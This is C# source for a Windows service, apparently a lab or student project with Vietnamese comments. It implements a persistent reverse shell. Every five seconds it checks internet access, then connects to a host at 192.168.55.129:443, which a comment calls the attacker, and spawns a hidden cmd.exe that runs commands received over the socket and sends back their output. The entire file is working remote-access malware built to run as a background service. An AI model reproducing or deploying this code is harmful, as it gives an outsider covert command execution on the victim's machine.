using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Runtime.InteropServices;
using System.Net.Sockets;

namespace KDH1
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
         
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; 
            timer.Enabled = true;
        }

        protected override void OnStop()
        {
            

        }
       
        public static bool CheckInternet()     // kiểm tra kết nối internet = cách truy cập thử vào đường đẫn đã cung cấp
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch { return false; }
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)    // hiển thị thông báo nếu kết nối thành công or thất bại
        {
           
            if (CheckInternet() == true)
            {
              
                ReverseShell();
            }
            else
            {
                string path = "C:\\Users\\LENOVO\\Desktop\\Đóng_Tiền_Mạng_Đi";
                if (!Directory.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
            }
        }

        private void SetOnAttacker()
        {
            ReverseShell();
        }

        static StreamWriter streamWriter;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void ReverseShell()     // chức năng Reverse Shell ở đây máy attacker có ip 192.168.55.129 ở port 443
        {
            var handle = GetConsoleWindow();

            try
            {
                using (TcpClient client = new TcpClient(hostname: "192.168.55.129", port:443))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder stringBuilder = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(OutputOfData);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                stringBuilder.Append(reader.ReadLine());
                                p.StandardInput.WriteLine(stringBuilder);
                                stringBuilder.Remove(0, stringBuilder.Length);
                            }
                        }
                   


                    }



                }    
            } 
            catch (Exception ex) {  }
        }

        private static void OutputOfData(object sender, DataReceivedEventArgs e)
        {
            StringBuilder stringBuilder_1 = new StringBuilder();

            if (!String.IsNullOrEmpty(e.Data))

            {

                try

                {

                    stringBuilder_1.Append(e.Data);

                    streamWriter.WriteLine(stringBuilder_1);

                    streamWriter.Flush();

                }

                catch { }

            }
        }

  
    }

}
